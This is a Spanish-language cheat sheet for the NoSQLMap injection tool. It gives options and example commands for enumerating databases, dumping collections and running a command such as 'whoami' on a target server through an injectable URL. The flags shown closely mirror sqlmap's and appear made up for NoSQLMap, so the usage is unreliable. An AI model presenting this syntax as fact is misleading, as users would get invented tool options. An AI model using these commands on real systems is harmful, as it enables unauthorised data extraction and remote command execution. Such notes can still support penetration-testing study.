### **Hacking Web/Inyecciones SQL/nosqlmap.md**

# NoSQLMap

## Descripción

`NoSQLMap` es una herramienta de código abierto diseñada para la detección y explotación de vulnerabilidades en bases de datos NoSQL. Automatiza el proceso de inyección y permite la extracción de datos de bases de datos como MongoDB, CouchDB, y otros sistemas NoSQL vulnerables.

## Uso

```bash
nosqlmap [opciones]
```

### Opciones principales

- `-u URL`: Especifica la URL objetivo para la inyección NoSQL.
- `-d DBNAME`: Selecciona la base de datos a explotar.
- `-t TABLENAME`: Selecciona la tabla o colección a explotar.
- `-c CMD`: Ejecuta un comando específico en el servidor.
- `--dump`: Extrae el contenido de la base de datos.
- `--dbs`: Enumera las bases de datos disponibles.
- `--tables`: Enumera las tablas o colecciones de una base de datos específica.
- `--columns`: Enumera las columnas o campos de una tabla o colección específica.
- `--threads N`: Define el número de hilos para acelerar la explotación.

## Ejemplos

- Escanear una URL en busca de vulnerabilidades NoSQL y enumerar las bases de datos:
  
  ```bash
  nosqlmap -u "http://example.com/api?query={}" --dbs
  ```

- Extraer todas las colecciones de una base de datos específica:
  
  ```bash
  nosqlmap -u "http://example.com/api?query={}" -d nombre_db --tables --dump
  ```

- Extraer campos específicos de una colección:
  
  ```bash
  nosqlmap -u "http://example.com/api?query={}" -d nombre_db -t nombre_coleccion --columns campo1,campo2 --dump
  ```

- Ejecutar un comando en el servidor:
  
  ```bash
  nosqlmap -u "http://example.com/api?query={}" -c "whoami"
  ```
